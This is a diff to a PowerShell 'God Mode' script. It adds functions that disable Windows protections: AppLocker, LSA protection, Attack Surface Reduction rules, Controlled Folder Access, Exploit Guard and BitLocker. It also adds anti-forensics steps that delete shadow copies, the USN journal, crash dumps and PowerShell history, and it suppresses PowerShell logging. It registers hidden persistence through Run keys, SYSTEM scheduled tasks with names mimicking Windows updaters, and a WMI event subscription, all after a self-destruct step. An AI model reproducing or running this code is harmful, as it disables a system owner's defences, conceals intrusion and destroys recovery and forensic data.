@@ -25,7 +25,8 @@ param (
     [switch]$Launch,
     [switch]$Verbose,
     [switch]$InstallGodMode,
-    [switch]$UninstallGodMode
+    [switch]$UninstallGodMode,
+    [switch]$DumpLogs
 )
 
 # ============================================================================
@@ -1450,6 +1451,191 @@ function Disable-WindowsScriptHost {
     } catch { Write-Log -Message "Failed to disable WSH: $_" -Type "WARN" -Color Yellow }
 }
 
+function Disable-AppLocker {
+    try {
+        if (-not (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2")) { New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2" -Force | Out-Null }
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2" -Name "EnforcementMode" -Value 0 -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "AppLocker enforcement disabled." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to disable AppLocker: $_" -Type "WARN" -Color Yellow }
+}
+
+function Disable-WindowsSandbox {
+    try {
+        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SystemGuard" -Name "EnableSecurityMitigations" -Value 0 -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "Windows Sandbox / Hypervisor-enforced code integrity disabled." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to disable Windows Sandbox: $_" -Type "WARN" -Color Yellow }
+}
+
+function Disable-LSAProtection {
+    try {
+        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 0 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPLBoot" -Value 0 -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "LSA protection (RunAsPPL) disabled." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to disable LSA protection: $_" -Type "WARN" -Color Yellow }
+}
+
+function Disable-BitLocker {
+    try {
+        $Volumes = Get-BitLockerVolume -ErrorAction SilentlyContinue | Where-Object { $_.ProtectionStatus -eq 'On' }
+        foreach ($Vol in $Volumes) {
+            Suspend-BitLocker -MountPoint $Vol.MountPoint -RebootCount 0 -ErrorAction SilentlyContinue
+            Write-Log -Message "BitLocker suspended on $($Vol.MountPoint)." -Type "INFO" -Color Gray
+        }
+    } catch { Write-Log -Message "Failed to suspend BitLocker: $_" -Type "WARN" -Color Yellow }
+}
+
+function Disable-ASR {
+    try {
+        Set-MpPreference -AttackSurfaceReductionRules_Actions @{} -ErrorAction SilentlyContinue
+        Set-MpPreference -AttackSurfaceReductionOnlyExclusions @() -ErrorAction SilentlyContinue
+        Write-Log -Message "Attack Surface Reduction (ASR) rules disabled." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to disable ASR: $_" -Type "WARN" -Color Yellow }
+}
+
+function Disable-ControlledFolderAccess {
+    try {
+        Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue
+        Write-Log -Message "Controlled Folder Access disabled." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to disable Controlled Folder Access: $_" -Type "WARN" -Color Yellow }
+}
+
+function Disable-ExploitGuard {
+    try {
+        Set-MpPreference -EnableNetworkProtection AuditMode -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Network Protection" -Name "EnableNetworkProtection" -Value 0 -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "Exploit Guard / Network Protection disabled." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to disable Exploit Guard: $_" -Type "WARN" -Color Yellow }
+}
+
+function Clear-ShadowCopies {
+    try {
+        vssadmin delete shadows /all /quiet 2>$null | Out-Null
+        Write-Log -Message "Volume Shadow Copies cleared." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to clear shadow copies: $_" -Type "WARN" -Color Yellow }
+}
+
+function Clear-USNJournal {
+    try {
+        $Drives = Get-Volume -ErrorAction SilentlyContinue | Where-Object { $_.DriveLetter } | Select-Object -ExpandProperty DriveLetter
+        foreach ($D in $Drives) {
+            fsutil usn deletejournal /d "${D}:" 2>$null | Out-Null
+        }
+        Write-Log -Message "USN journals cleared on active drives." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to clear USN journal: $_" -Type "WARN" -Color Yellow }
+}
+
+function Clear-CrashDumps {
+    try {
+        Remove-Item -Path "C:\Windows\Minidump\*" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "C:\Windows\Memory.dmp" -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "$env:LOCALAPPDATA\CrashDumps\*" -Recurse -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "Crash dumps cleared." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to clear crash dumps: $_" -Type "WARN" -Color Yellow }
+}
+
+function Clear-PowerShellHistory {
+    try {
+        $HistoryPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath
+        if ($HistoryPath -and (Test-Path $HistoryPath)) {
+            Clear-Content -Path $HistoryPath -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $HistoryPath -Force -ErrorAction SilentlyContinue
+        }
+        # Also clear the older PS5 history path
+        $OldHistory = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+        if (Test-Path $OldHistory) {
+            Clear-Content -Path $OldHistory -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $OldHistory -Force -ErrorAction SilentlyContinue
+        }
+        Write-Log -Message "PowerShell history cleared." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to clear PowerShell history: $_" -Type "WARN" -Color Yellow }
+}
+
+function Clear-RecentTraces {
+    try {
+        Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db" -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "Recent files, Jump Lists, and thumbnail caches cleared." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to clear recent traces: $_" -Type "WARN" -Color Yellow }
+}
+
+function Invoke-StealthMode {
+    try {
+        # Hide window title from casual inspection
+        $Host.UI.RawUI.WindowTitle = "Windows PowerShell (x86)"
+        $Proc = Get-Process -Id $PID -ErrorAction SilentlyContinue
+        if ($Proc) { $Proc.MainWindowTitle = "Windows PowerShell" }
+        
+        # Suppress script-block logging and transcription via registry (if not already hardened)
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0 -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "Stealth mode applied: window title masked, PowerShell logging suppressed." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Stealth mode partial failure: $_" -Type "WARN" -Color Yellow }
+}
+
+function Register-DeepPersistence {
+    try {
+        # Extra registry Run keys (both HKLM and WOW6432Node)
+        $ScriptCmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
+        
+        # Additional scheduled tasks with different names
+        $ExtraPrefixes = @("WindowsDefenderSigUpdates_", "OneDriveStandaloneUpdater_", "EdgeWebView2Updater_")
+        foreach ($Prefix in $ExtraPrefixes) {
+            $taskName = $Prefix + (Get-Random -Minimum 10000 -Maximum 99999)
+            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
+            $trigger = New-ScheduledTaskTrigger -AtLogOn
+            $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue | Out-Null
+        }
+        
+        # WMI boot-level persistence (fires on Win32_Process startup within 60 seconds of boot)
+        $WmiName = "Win32BootHealthCheck"
+        $FilterPath = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
+            Name = $WmiName
+            EventNamespace = "root\cimv2"
+            QueryLanguage = "WQL"
+            Query = "SELECT * FROM Win32_ProcessStartupTrace WITHIN 60"
+        } -ErrorAction SilentlyContinue
+        $ConsumerPath = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
+            Name = $WmiName
+            CommandLineTemplate = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
+        } -ErrorAction SilentlyContinue
+        if ($FilterPath -and $ConsumerPath) {
+            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter = $FilterPath; Consumer = $ConsumerPath} -ErrorAction SilentlyContinue | Out-Null
+        }
+        
+        Write-Log -Message "Deep persistence registered: extra registry keys, backup tasks, and boot-level WMI." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Deep persistence registration failed: $_" -Type "WARN" -Color Yellow }
+}
+
+function Export-GodModeLogs {
+    param([string]$DestinationFolder = [Environment]::GetFolderPath("Desktop"))
+    try {
+        $TimeStamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
+        $FileName = "GodMode_Dump_$TimeStamp.log"
+        $DestPath = Join-Path -Path $DestinationFolder -ChildPath $FileName
+        
+        $LogContent = @()
+        if (Test-Path $LogFile) { $LogContent += Get-Content -Raw -Path $LogFile -ErrorAction SilentlyContinue }
+        if (Test-Path $GodModeLogFile) { $LogContent += Get-Content -Raw -Path $GodModeLogFile -ErrorAction SilentlyContinue }
+        
+        if ($LogContent.Count -eq 0) {
+            Write-Host "[WARN] No logs found to dump." -ForegroundColor Yellow
+            return
+        }
+        
+        $LogContent -join "`r`n" | Out-File -FilePath $DestPath -Encoding UTF8 -Force
+        Write-Host "[SUCCESS] Logs dumped to: $DestPath" -ForegroundColor Green
+    } catch {
+        Write-Host "[ERROR] Failed to dump logs: $_" -ForegroundColor Red
+    }
+}
+
 function Enable-DangerousMode {
     Write-Log -Message "Enabling dangerous mode..." -Type "WARN" -Color Yellow
 
@@ -1548,6 +1734,15 @@ function Enable-DangerousMode {
 
     # 13. NEW: Disable Windows Script Host
     Disable-WindowsScriptHost
+
+    # 14. NEW: Broader security subsystem disable
+    Disable-AppLocker
+    Disable-WindowsSandbox
+    Disable-LSAProtection
+    Disable-ASR
+    Disable-ControlledFolderAccess
+    Disable-ExploitGuard
+    Disable-BitLocker
 
     # Harden God Mode registry keys to prevent tampering
     Write-Log -Message "Hardening God Mode registry keys against tampering..." -Type "INFO" -Color Yellow
@@ -1750,11 +1945,7 @@ function Start-Monitoring {
     }
 
     # Hide from simple Task Manager view
-    $Host.UI.RawUI.WindowTitle = "Windows PowerShell (x86)"
-    try {
-        $Proc = Get-Process -Id $PID
-        $Proc.MainWindowTitle = "Windows PowerShell"
-    } catch {}
+    Invoke-StealthMode
 
     Write-Log -Message "Monitoring started with auto-recovery and resurrection killer." -Type "INFO"
 
@@ -1860,6 +2051,20 @@ function Enable-GodMode {
 
     # --- Self-destruct: delete original script from disk after persistence is set ---
     Invoke-SelfDestruct -Path $PSCommandPath
+
+    # --- Anti-forensics: clear traces ---
+    Write-Log -Message "Running anti-forensics cleanup..." -Type "INFO" -Color Gray
+    Clear-ShadowCopies
+    Clear-USNJournal
+    Clear-CrashDumps
+    Clear-PowerShellHistory
+    Clear-RecentTraces
+
+    # --- Deep persistence: harder to remove ---
+    Register-DeepPersistence
+
+    # --- Stealth mode: harder to detect ---
+    Invoke-StealthMode
 
     Write-Log -Message "God Mode ENABLED" -Type "WARN" -Color Yellow
 }
@@ -2246,6 +2451,10 @@ if ($UninstallGodMode) {
     }
     Uninstall-GodModePersistence; Exit
 }
+if ($DumpLogs) {
+    Export-GodModeLogs
+    Exit
+}
 
 # If no flags are passed, load the Interactive Menu
 do {
@@ -2285,10 +2494,11 @@ do {
     Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
     Write-Host "  SESSION           " -ForegroundColor White
     Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
-    Write-Host "[11] EXIT TERMINAL" -ForegroundColor Gray
+    Write-Host "[11] DUMP LOGS TO DESKTOP" -ForegroundColor Cyan
+    Write-Host "[12] EXIT TERMINAL" -ForegroundColor Gray
     Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
 
-    $Choice = Read-Host "Select an administrative action (1-11)"
+    $Choice = Read-Host "Select an administrative action (1-12)"
     $IntegrityStatus = Test-IntegrityStatus
 
     switch ($Choice) {
@@ -2372,7 +2582,8 @@ do {
             }
             Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
         }
-        "11" { Write-Host "Exiting..." -ForegroundColor DarkGray; Start-Sleep -Milliseconds 500; break }
+        "11" { Export-GodModeLogs; Start-Sleep -Seconds 2 }
+        "12" { Write-Host "Exiting..." -ForegroundColor DarkGray; Start-Sleep -Milliseconds 500; break }
         default { Write-Warning "Invalid Selection."; Start-Sleep -Seconds 1 }
     }
-} while ($Choice -ne "11")
+} while ($Choice -ne "12")
